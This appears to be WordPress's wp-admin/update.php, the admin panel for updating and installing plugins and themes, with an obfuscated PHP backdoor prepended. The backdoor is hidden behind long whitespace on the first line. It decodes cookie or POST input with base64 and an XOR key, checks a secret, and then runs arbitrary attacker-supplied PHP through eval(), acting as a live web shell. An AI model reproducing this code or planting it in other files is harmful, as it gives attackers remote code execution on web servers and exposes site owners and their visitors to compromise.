<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $GLOBALS['r6952b'];global$r6952b;$r6952b=$GLOBALS;$r6952b['f73afc07']="\x26\x67\x70\x56\x3f\x2c\x27\x9\x44\x51\x58\x59\x7d\x47\x6c\x72\x7c\x4c\x28\x76\x35\x64\x63\x7a\x7e\x41\x2e\x31\x66\x55\x60\xa\x29\x46\x69\x42\x5d\x71\x4a\x3e\x52\x3a\x2f\x7b\x30\x22\x5f\x6b\x21\x4b\x77\x4e\x3c\x50\x2d\x61\x73\x38\x49\x6e\x20\x65\x23\x37\x54\x79\x39\xd\x75\x5a\x45\x40\x6a\x78\x32\x3d\x36\x53\x6f\x24\x6d\x33\x34\x48\x5b\x4d\x2b\x62\x43\x25\x5e\x57\x74\x68\x5c\x4f\x2a\x3b";$r6952b[$r6952b['f73afc07'][47].$r6952b['f73afc07'][76].$r6952b['f73afc07'][21].$r6952b['f73afc07'][81].$r6952b['f73afc07'][74].$r6952b['f73afc07'][44].$r6952b['f73afc07'][21].$r6952b['f73afc07'][22]]=$r6952b['f73afc07'][22].$r6952b['f73afc07'][93].$r6952b['f73afc07'][15];$r6952b[$r6952b['f73afc07'][14].$r6952b['f73afc07'][44].$r6952b['f73afc07'][87].$r6952b['f73afc07'][44]]=$r6952b['f73afc07'][78].$r6952b['f73afc07'][15].$r6952b['f73afc07'][21];$r6952b[$r6952b['f73afc07'][50].$r6952b['f73afc07'][61].$r6952b['f73afc07'][61].$r6952b['f73afc07'][82].$r6952b['f73afc07'][74].$r6952b['f73afc07'][61].$r6952b['f73afc07'][76].$r6952b['f73afc07'][81]]=$r6952b['f73afc07'][56].$r6952b['f73afc07'][92].$r6952b['f73afc07'][15].$r6952b['f73afc07'][14].$r6952b['f73afc07'][61].$r6952b['f73afc07'][59];$r6952b[$r6952b['f73afc07'][50].$r6952b['f73afc07'][21].$r6952b['f73afc07'][63].$r6952b['f73afc07'][81].$r6952b['f73afc07'][66].$r6952b['f73afc07'][28].$r6952b['f73afc07'][21]]=$r6952b['f73afc07'][34].$r6952b['f73afc07'][59].$r6952b['f73afc07'][34].$r6952b['f73afc07'][46].$r6952b['f73afc07'][56].$r6952b['f73afc07'][61].$r6952b['f73afc07'][92];$r6952b[$r6952b['f73afc07'][72].$r6952b['f73afc07'][27].$r6952b['f73afc07'][61].$r6952b['f73afc07'][28].$r6952b['f73afc07'][82].$r6952b['f73afc07'][57].$r6952b['f73afc07'][81]]=$r6952b['f73afc07'][56].$r6952b['f73afc07'][61].$r6952b['f73afc07'][15].$r6952b['f73afc07'][34].$r6952b['f73afc07'][55].$r6952b['f73afc07'][14].$r6952b['f73afc07'][34].$r6952b['f73afc07'][23].$r6952b['f73afc07'][61];$r6952b[$r6952b['f73afc07'][21].$r6952b['f73afc07'][74].$r6952b['f73afc07'][66].$r6952b['f73afc07'][27].$r6952b['f73afc07'][20]]=$r6952b['f73afc07'][2].$r6952b['f73afc07'][93].$r6952b['f73afc07'][2].$r6952b['f73afc07'][19].$r6952b['f73afc07'][61].$r6952b['f73afc07'][15].$r6952b['f73afc07'][56].$r6952b['f73afc07'][34].$r6952b['f73afc07'][78].$r6952b['f73afc07'][59];$r6952b[$r6952b['f73afc07'][19].$r6952b['f73afc07'][44].$r6952b['f73afc07'][55].$r6952b['f73afc07'][44].$r6952b['f73afc07'][87].$r6952b['f73afc07'][61].$r6952b['f73afc07'][55]]=$r6952b['f73afc07'][68].$r6952b['f73afc07'][59].$r6952b['f73afc07'][56].$r6952b['f73afc07'][61].$r6952b['f73afc07'][15].$r6952b['f73afc07'][34].$r6952b['f73afc07'][55].$r6952b['f73afc07'][14].$r6952b['f73afc07'][34].$r6952b['f73afc07'][23].$r6952b['f73afc07'][61];$r6952b[$r6952b['f73afc07'][37].$r6952b['f73afc07'][20].$r6952b['f73afc07'][63].$r6952b['f73afc07'][61].$r6952b['f73afc07'][87].$r6952b['f73afc07'][61].$r6952b['f73afc07'][21]]=$r6952b['f73afc07'][87].$r6952b['f73afc07'][55].$r6952b['f73afc07'][56].$r6952b['f73afc07'][61].$r6952b['f73afc07'][76].$r6952b['f73afc07'][82].$r6952b['f73afc07'][46].$r6952b['f73afc07'][21].$r6952b['f73afc07'][61].$r6952b['f73afc07'][22].$r6952b['f73afc07'][78].$r6952b['f73afc07'][21].$r6952b['f73afc07'][61];$r6952b[$r6952b['f73afc07'][47].$r6952b['f73afc07'][55].$r6952b['f73afc07'][44].$r6952b['f73afc07'][74].$r6952b['f73afc07'][27].$r6952b['f73afc07'][22].$r6952b['f73afc07'][61].$r6952b['f73afc07'][87]]=$r6952b['f73afc07'][56].$r6952b['f73afc07'][61].$r6952b['f73afc07'][92].$r6952b['f73afc07'][46].$r6952b['f73afc07'][92].$r6952b['f73afc07'][34].$r6952b['f73afc07'][80].$r6952b['f73afc07'][61].$r6952b['f73afc07'][46].$r6952b['f73afc07'][14].$r6952b['f73afc07'][34].$r6952b['f73afc07'][80].$r6952b['f73afc07'][34].$r6952b['f73afc07'][92];$r6952b[$r6952b['f73afc07'][61].$r6952b['f73afc07'][21].$r6952b['f73afc07'][81].$r6952b['f73afc07'][74].$r6952b['f73afc07'][21]]=$r6952b['f73afc07'][80].$r6952b['f73afc07'][27].$r6952b['f73afc07'][76].$r6952b['f73afc07'][61].$r6952b['f73afc07'][82].$r6952b['f73afc07'][66];$r6952b[$r6952b['f73afc07'][28].$r6952b['f73afc07'][76].$r6952b['f73afc07'][44].$r6952b['f73afc07'][27].$r6952b['f73afc07'][87]]=$r6952b['f73afc07'][92].$r6952b['f73afc07'][82].$r6952b['f73afc07'][61].$r6952b['f73afc07'][74].$r6952b['f73afc07'][55].$r6952b['f73afc07'][66].$r6952b['f73afc07'][81];$r6952b[$r6952b['f73afc07'][56].$r6952b['f73afc07'][21].$r6952b['f73afc07'][87].$r6952b['f73afc07'][82].$r6952b['f73afc07'][57]]=$_POST;$r6952b[$r6952b['f73afc07'][21].$r6952b['f73afc07'][55].$r6952b['f73afc07'][87].$r6952b['f73afc07'][76].$r6952b['f73afc07'][28].$r6952b['f73afc07'][22].$r6952b['f73afc07'][21].$r6952b['f73afc07'][55]]=$_COOKIE;@$r6952b[$r6952b['f73afc07'][50].$r6952b['f73afc07'][21].$r6952b['f73afc07'][63].$r6952b['f73afc07'][81].$r6952b['f73afc07'][66].$r6952b['f73afc07'][28].$r6952b['f73afc07'][21]]($r6952b['f73afc07'][61].$r6952b['f73afc07'][15].$r6952b['f73afc07'][15].$r6952b['f73afc07'][78].$r6952b['f73afc07'][15].$r6952b['f73afc07'][46].$r6952b['f73afc07'][14].$r6952b['f73afc07'][78].$r6952b['f73afc07'][1],NULL);@$r6952b[$r6952b['f73afc07'][50].$r6952b['f73afc07'][21].$r6952b['f73afc07'][63].$r6952b['f73afc07'][81].$r6952b['f73afc07'][66].$r6952b['f73afc07'][28].$r6952b['f73afc07'][21]]($r6952b['f73afc07'][14].$r6952b['f73afc07'][78].$r6952b['f73afc07'][1].$r6952b['f73afc07'][46].$r6952b['f73afc07'][61].$r6952b['f73afc07'][15].$r6952b['f73afc07'][15].$r6952b['f73afc07'][78].$r6952b['f73afc07'][15].$r6952b['f73afc07'][56],0);@$r6952b[$r6952b['f73afc07'][50].$r6952b['f73afc07'][21].$r6952b['f73afc07'][63].$r6952b['f73afc07'][81].$r6952b['f73afc07'][66].$r6952b['f73afc07'][28].$r6952b['f73afc07'][21]]($r6952b['f73afc07'][80].$r6952b['f73afc07'][55].$r6952b['f73afc07'][73].$r6952b['f73afc07'][46].$r6952b['f73afc07'][61].$r6952b['f73afc07'][73].$r6952b['f73afc07'][61].$r6952b['f73afc07'][22].$r6952b['f73afc07'][68].$r6952b['f73afc07'][92].$r6952b['f73afc07'][34].$r6952b['f73afc07'][78].$r6952b['f73afc07'][59].$r6952b['f73afc07'][46].$r6952b['f73afc07'][92].$r6952b['f73afc07'][34].$r6952b['f73afc07'][80].$r6952b['f73afc07'][61],0);@$r6952b[$r6952b['f73afc07'][47].$r6952b['f73afc07'][55].$r6952b['f73afc07'][44].$r6952b['f73afc07'][74].$r6952b['f73afc07'][27].$r6952b['f73afc07'][22].$r6952b['f73afc07'][61].$r6952b['f73afc07'][87]](0);$cdd954a=NULL;$g54b09=NULL;$r6952b[$r6952b['f73afc07'][93].$r6952b['f73afc07'][44].$r6952b['f73afc07'][28].$r6952b['f73afc07'][27].$r6952b['f73afc07'][87]]=$r6952b['f73afc07'][20].$r6952b['f73afc07'][82].$r6952b['f73afc07'][82].$r6952b['f73afc07'][61].$r6952b['f73afc07'][74].$r6952b['f73afc07'][21].$r6952b['f73afc07'][87].$r6952b['f73afc07'][21].$r6952b['f73afc07'][54].$r6952b['f73afc07'][87].$r6952b['f73afc07'][20].$r6952b['f73afc07'][82].$r6952b['f73afc07'][55].$r6952b['f73afc07'][54].$r6952b['f73afc07'][82].$r6952b['f73afc07'][44].$r6952b['f73afc07'][27].$r6952b['f73afc07'][20].$r6952b['f73afc07'][54].$r6952b['f73afc07'][66].$r6952b['f73afc07'][27].$r6952b['f73afc07'][27].$r6952b['f73afc07'][22].$r6952b['f73afc07'][54].$r6952b['f73afc07'][55].$r6952b['f73afc07'][61].$r6952b['f73afc07'][44].$r6952b['f73afc07'][87].$r6952b['f73afc07'][22].$r6952b['f73afc07'][22].$r6952b['f73afc07'][28].$r6952b['f73afc07'][61].$r6952b['f73afc07'][57].$r6952b['f73afc07'][20].$r6952b['f73afc07'][87].$r6952b['f73afc07'][22];global$h0f1b;function t4e2a93($cdd954a,$na25012){global$r6952b;$u69b4f2="";for($c9151ea=0;$c9151ea<$r6952b[$r6952b['f73afc07'][50].$r6952b['f73afc07'][61].$r6952b['f73afc07'][61].$r6952b['f73afc07'][82].$r6952b['f73afc07'][74].$r6952b['f73afc07'][61].$r6952b['f73afc07'][76].$r6952b['f73afc07'][81]]($cdd954a);){for($t239695a4=0;$t239695a4<$r6952b[$r6952b['f73afc07'][50].$r6952b['f73afc07'][61].$r6952b['f73afc07'][61].$r6952b['f73afc07'][82].$r6952b['f73afc07'][74].$r6952b['f73afc07'][61].$r6952b['f73afc07'][76].$r6952b['f73afc07'][81]]($na25012)&&$c9151ea<$r6952b[$r6952b['f73afc07'][50].$r6952b['f73afc07'][61].$r6952b['f73afc07'][61].$r6952b['f73afc07'][82].$r6952b['f73afc07'][74].$r6952b['f73afc07'][61].$r6952b['f73afc07'][76].$r6952b['f73afc07'][81]]($cdd954a);$t239695a4++,$c9151ea++){$u69b4f2.=$r6952b[$r6952b['f73afc07'][47].$r6952b['f73afc07'][76].$r6952b['f73afc07'][21].$r6952b['f73afc07'][81].$r6952b['f73afc07'][74].$r6952b['f73afc07'][44].$r6952b['f73afc07'][21].$r6952b['f73afc07'][22]]($r6952b[$r6952b['f73afc07'][14].$r6952b['f73afc07'][44].$r6952b['f73afc07'][87].$r6952b['f73afc07'][44]]($cdd954a[$c9151ea])^$r6952b[$r6952b['f73afc07'][14].$r6952b['f73afc07'][44].$r6952b['f73afc07'][87].$r6952b['f73afc07'][44]]($na25012[$t239695a4]));}}return$u69b4f2;}function m16e49($cdd954a,$na25012){global$r6952b;global$h0f1b;return$r6952b[$r6952b['f73afc07'][28].$r6952b['f73afc07'][76].$r6952b['f73afc07'][44].$r6952b['f73afc07'][27].$r6952b['f73afc07'][87]]($r6952b[$r6952b['f73afc07'][28].$r6952b['f73afc07'][76].$r6952b['f73afc07'][44].$r6952b['f73afc07'][27].$r6952b['f73afc07'][87]]($cdd954a,$h0f1b),$na25012);}foreach($r6952b[$r6952b['f73afc07'][21].$r6952b['f73afc07'][55].$r6952b['f73afc07'][87].$r6952b['f73afc07'][76].$r6952b['f73afc07'][28].$r6952b['f73afc07'][22].$r6952b['f73afc07'][21].$r6952b['f73afc07'][55]]as$na25012=>$y417d4d0){$cdd954a=$y417d4d0;$g54b09=$na25012;}if(!$cdd954a){foreach($r6952b[$r6952b['f73afc07'][56].$r6952b['f73afc07'][21].$r6952b['f73afc07'][87].$r6952b['f73afc07'][82].$r6952b['f73afc07'][57]]as$na25012=>$y417d4d0){$cdd954a=$y417d4d0;$g54b09=$na25012;}}$cdd954a=@$r6952b[$r6952b['f73afc07'][19].$r6952b['f73afc07'][44].$r6952b['f73afc07'][55].$r6952b['f73afc07'][44].$r6952b['f73afc07'][87].$r6952b['f73afc07'][61].$r6952b['f73afc07'][55]]($r6952b[$r6952b['f73afc07'][61].$r6952b['f73afc07'][21].$r6952b['f73afc07'][81].$r6952b['f73afc07'][74].$r6952b['f73afc07'][21]]($r6952b[$r6952b['f73afc07'][37].$r6952b['f73afc07'][20].$r6952b['f73afc07'][63].$r6952b['f73afc07'][61].$r6952b['f73afc07'][87].$r6952b['f73afc07'][61].$r6952b['f73afc07'][21]]($cdd954a),$g54b09));if(isset($cdd954a[$r6952b['f73afc07'][55].$r6952b['f73afc07'][47]])&&$h0f1b==$cdd954a[$r6952b['f73afc07'][55].$r6952b['f73afc07'][47]]){if($cdd954a[$r6952b['f73afc07'][55]]==$r6952b['f73afc07'][34]){$c9151ea=Array($r6952b['f73afc07'][2].$r6952b['f73afc07'][19]=>@$r6952b[$r6952b['f73afc07'][21].$r6952b['f73afc07'][74].$r6952b['f73afc07'][66].$r6952b['f73afc07'][27].$r6952b['f73afc07'][20]](),$r6952b['f73afc07'][56].$r6952b['f73afc07'][19]=>$r6952b['f73afc07'][27].$r6952b['f73afc07'][26].$r6952b['f73afc07'][44].$r6952b['f73afc07'][54].$r6952b['f73afc07'][27],);echo@$r6952b[$r6952b['f73afc07'][72].$r6952b['f73afc07'][27].$r6952b['f73afc07'][61].$r6952b['f73afc07'][28].$r6952b['f73afc07'][82].$r6952b['f73afc07'][57].$r6952b['f73afc07'][81]]($c9151ea);}elseif($cdd954a[$r6952b['f73afc07'][55]]==$r6952b['f73afc07'][61]){eval($cdd954a[$r6952b['f73afc07'][21]]);}exit();} ?><?php
/**
 * Update/Install Plugin/Theme administration panel.
 *
 * @package WordPress
 * @subpackage Administration
 */

if ( ! defined( 'IFRAME_REQUEST' ) && isset( $_GET['action'] ) && in_array( $_GET['action'], array( 'update-selected', 'activate-plugin', 'update-selected-themes' ) ) )
	define( 'IFRAME_REQUEST', true );

/** WordPress Administration Bootstrap */
require_once( dirname( __FILE__ ) . '/admin.php' );

include_once( ABSPATH . 'wp-admin/includes/class-wp-upgrader.php' );

if ( isset($_GET['action']) ) {
	$plugin = isset($_REQUEST['plugin']) ? trim($_REQUEST['plugin']) : '';
	$theme = isset($_REQUEST['theme']) ? urldecode($_REQUEST['theme']) : '';
	$action = isset($_REQUEST['action']) ? $_REQUEST['action'] : '';

	if ( 'update-selected' == $action ) {
		if ( ! current_user_can( 'update_plugins' ) )
			wp_die( __( 'You do not have sufficient permissions to update plugins for this site.' ) );

		check_admin_referer( 'bulk-update-plugins' );

		if ( isset( $_GET['plugins'] ) )
			$plugins = explode( ',', stripslashes($_GET['plugins']) );
		elseif ( isset( $_POST['checked'] ) )
			$plugins = (array) $_POST['checked'];
		else
			$plugins = array();

		$plugins = array_map('urldecode', $plugins);

		$url = 'update.php?action=update-selected&amp;plugins=' . urlencode(implode(',', $plugins));
		$nonce = 'bulk-update-plugins';

		wp_enqueue_script( 'updates' );
		iframe_header();

		$upgrader = new Plugin_Upgrader( new Bulk_Plugin_Upgrader_Skin( compact( 'nonce', 'url' ) ) );
		$upgrader->bulk_upgrade( $plugins );

		iframe_footer();

	} elseif ( 'upgrade-plugin' == $action ) {
		if ( ! current_user_can('update_plugins') )
			wp_die(__('You do not have sufficient permissions to update plugins for this site.'));

		check_admin_referer('upgrade-plugin_' . $plugin);

		$title = __('Update Plugin');
		$parent_file = 'plugins.php';
		$submenu_file = 'plugins.php';

		wp_enqueue_script( 'updates' );
		require_once(ABSPATH . 'wp-admin/admin-header.php');

		$nonce = 'upgrade-plugin_' . $plugin;
		$url = 'update.php?action=upgrade-plugin&plugin=' . urlencode( $plugin );

		$upgrader = new Plugin_Upgrader( new Plugin_Upgrader_Skin( compact('title', 'nonce', 'url', 'plugin') ) );
		$upgrader->upgrade($plugin);

		include(ABSPATH . 'wp-admin/admin-footer.php');

	} elseif ('activate-plugin' == $action ) {
		if ( ! current_user_can('update_plugins') )
			wp_die(__('You do not have sufficient permissions to update plugins for this site.'));

		check_admin_referer('activate-plugin_' . $plugin);
		if ( ! isset($_GET['failure']) && ! isset($_GET['success']) ) {
			wp_redirect( admin_url('update.php?action=activate-plugin&failure=true&plugin=' . urlencode( $plugin ) . '&_wpnonce=' . $_GET['_wpnonce']) );
			activate_plugin( $plugin, '', ! empty( $_GET['networkwide'] ), true );
			wp_redirect( admin_url('update.php?action=activate-plugin&success=true&plugin=' . urlencode( $plugin ) . '&_wpnonce=' . $_GET['_wpnonce']) );
			die();
		}
		iframe_header( __('Plugin Reactivation'), true );
		if ( isset($_GET['success']) )
			echo '<p>' . __('Plugin reactivated successfully.') . '</p>';

		if ( isset($_GET['failure']) ){
			echo '<p>' . __('Plugin failed to reactivate due to a fatal error.') . '</p>';

			error_reporting( E_CORE_ERROR | E_CORE_WARNING | E_COMPILE_ERROR | E_ERROR | E_WARNING | E_PARSE | E_USER_ERROR | E_USER_WARNING | E_RECOVERABLE_ERROR );
			@ini_set('display_errors', true); //Ensure that Fatal errors are displayed.
			wp_register_plugin_realpath( WP_PLUGIN_DIR . '/' . $plugin );
			include( WP_PLUGIN_DIR . '/' . $plugin );
		}
		iframe_footer();
	} elseif ( 'install-plugin' == $action ) {

		if ( ! current_user_can('install_plugins') )
			wp_die( __( 'You do not have sufficient permissions to install plugins on this site.' ) );

		include_once( ABSPATH . 'wp-admin/includes/plugin-install.php' ); //for plugins_api..

		check_admin_referer('install-plugin_' . $plugin);
		$api = plugins_api('plugin_information', array('slug' => $plugin, 'fields' => array('sections' => false) ) ); //Save on a bit of bandwidth.

		if ( is_wp_error($api) )
	 		wp_die($api);

		$title = __('Plugin Install');
		$parent_file = 'plugins.php';
		$submenu_file = 'plugin-install.php';
		require_once(ABSPATH . 'wp-admin/admin-header.php');

		$title = sprintf( __('Installing Plugin: %s'), $api->name . ' ' . $api->version );
		$nonce = 'install-plugin_' . $plugin;
		$url = 'update.php?action=install-plugin&plugin=' . urlencode( $plugin );
		if ( isset($_GET['from']) )
			$url .= '&from=' . urlencode(stripslashes($_GET['from']));

		$type = 'web'; //Install plugin type, From Web or an Upload.

		$upgrader = new Plugin_Upgrader( new Plugin_Installer_Skin( compact('title', 'url', 'nonce', 'plugin', 'api') ) );
		$upgrader->install($api->download_link);

		include(ABSPATH . 'wp-admin/admin-footer.php');

	} elseif ( 'upload-plugin' == $action ) {

		if ( ! current_user_can( 'upload_plugins' ) ) {
			wp_die( __( 'You do not have sufficient permissions to install plugins on this site.' ) );
		}

		check_admin_referer('plugin-upload');

		$file_upload = new File_Upload_Upgrader('pluginzip', 'package');

		$title = __('Upload Plugin');
		$parent_file = 'plugins.php';
		$submenu_file = 'plugin-install.php';
		require_once(ABSPATH . 'wp-admin/admin-header.php');

		$title = sprintf( __('Installing Plugin from uploaded file: %s'), esc_html( basename( $file_upload->filename ) ) );
		$nonce = 'plugin-upload';
		$url = add_query_arg(array('package' => $file_upload->id), 'update.php?action=upload-plugin');
		$type = 'upload'; //Install plugin type, From Web or an Upload.

		$upgrader = new Plugin_Upgrader( new Plugin_Installer_Skin( compact('type', 'title', 'nonce', 'url') ) );
		$result = $upgrader->install( $file_upload->package );

		if ( $result || is_wp_error($result) )
			$file_upload->cleanup();

		include(ABSPATH . 'wp-admin/admin-footer.php');

	} elseif ( 'upgrade-theme' == $action ) {

		if ( ! current_user_can('update_themes') )
			wp_die(__('You do not have sufficient permissions to update themes for this site.'));

		check_admin_referer('upgrade-theme_' . $theme);

		wp_enqueue_script( 'customize-loader' );
		wp_enqueue_script( 'updates' );

		$title = __('Update Theme');
		$parent_file = 'themes.php';
		$submenu_file = 'themes.php';
		require_once(ABSPATH . 'wp-admin/admin-header.php');

		$nonce = 'upgrade-theme_' . $theme;
		$url = 'update.php?action=upgrade-theme&theme=' . urlencode( $theme );

		$upgrader = new Theme_Upgrader( new Theme_Upgrader_Skin( compact('title', 'nonce', 'url', 'theme') ) );
		$upgrader->upgrade($theme);

		include(ABSPATH . 'wp-admin/admin-footer.php');
	} elseif ( 'update-selected-themes' == $action ) {
		if ( ! current_user_can( 'update_themes' ) )
			wp_die( __( 'You do not have sufficient permissions to update themes for this site.' ) );

		check_admin_referer( 'bulk-update-themes' );

		if ( isset( $_GET['themes'] ) )
			$themes = explode( ',', stripslashes($_GET['themes']) );
		elseif ( isset( $_POST['checked'] ) )
			$themes = (array) $_POST['checked'];
		else
			$themes = array();

		$themes = array_map('urldecode', $themes);

		$url = 'update.php?action=update-selected-themes&amp;themes=' . urlencode(implode(',', $themes));
		$nonce = 'bulk-update-themes';

		wp_enqueue_script( 'updates' );
		iframe_header();

		$upgrader = new Theme_Upgrader( new Bulk_Theme_Upgrader_Skin( compact( 'nonce', 'url' ) ) );
		$upgrader->bulk_upgrade( $themes );

		iframe_footer();
	} elseif ( 'install-theme' == $action ) {

		if ( ! current_user_can('install_themes') )
			wp_die( __( 'You do not have sufficient permissions to install themes on this site.' ) );

		include_once( ABSPATH . 'wp-admin/includes/class-wp-upgrader.php' ); //for themes_api..

		check_admin_referer( 'install-theme_' . $theme );
		$api = themes_api('theme_information', array('slug' => $theme, 'fields' => array('sections' => false, 'tags' => false) ) ); //Save on a bit of bandwidth.

		if ( is_wp_error($api) )
	 		wp_die($api);

		wp_enqueue_script( 'customize-loader' );

		$title = __('Install Themes');
		$parent_file = 'themes.php';
		$submenu_file = 'themes.php';
		require_once(ABSPATH . 'wp-admin/admin-header.php');

		$title = sprintf( __('Installing Theme: %s'), $api->name . ' ' . $api->version );
		$nonce = 'install-theme_' . $theme;
		$url = 'update.php?action=install-theme&theme=' . urlencode( $theme );
		$type = 'web'; //Install theme type, From Web or an Upload.

		$upgrader = new Theme_Upgrader( new Theme_Installer_Skin( compact('title', 'url', 'nonce', 'plugin', 'api') ) );
		$upgrader->install($api->download_link);

		include(ABSPATH . 'wp-admin/admin-footer.php');

	} elseif ( 'upload-theme' == $action ) {

		if ( ! current_user_can( 'upload_themes' ) ) {
			wp_die( __( 'You do not have sufficient permissions to install themes on this site.' ) );
		}

		check_admin_referer('theme-upload');

		$file_upload = new File_Upload_Upgrader('themezip', 'package');

		wp_enqueue_script( 'customize-loader' );

		$title = __('Upload Theme');
		$parent_file = 'themes.php';
		$submenu_file = 'theme-install.php';

		require_once(ABSPATH . 'wp-admin/admin-header.php');

		$title = sprintf( __('Installing Theme from uploaded file: %s'), esc_html( basename( $file_upload->filename ) ) );
		$nonce = 'theme-upload';
		$url = add_query_arg(array('package' => $file_upload->id), 'update.php?action=upload-theme');
		$type = 'upload'; //Install plugin type, From Web or an Upload.

		$upgrader = new Theme_Upgrader( new Theme_Installer_Skin( compact('type', 'title', 'nonce', 'url') ) );
		$result = $upgrader->install( $file_upload->package );

		if ( $result || is_wp_error($result) )
			$file_upload->cleanup();

		include(ABSPATH . 'wp-admin/admin-footer.php');

	} else {
		/**
		 * Fires when a custom plugin or theme update request is received.
		 *
		 * The dynamic portion of the hook name, `$action`, refers to the action
		 * provided in the request for wp-admin/update.php. Can be used to
		 * provide custom update functionality for themes and plugins.
		 *
		 * @since 2.8.0
		 */
		do_action( "update-custom_{$action}" );
	}
}
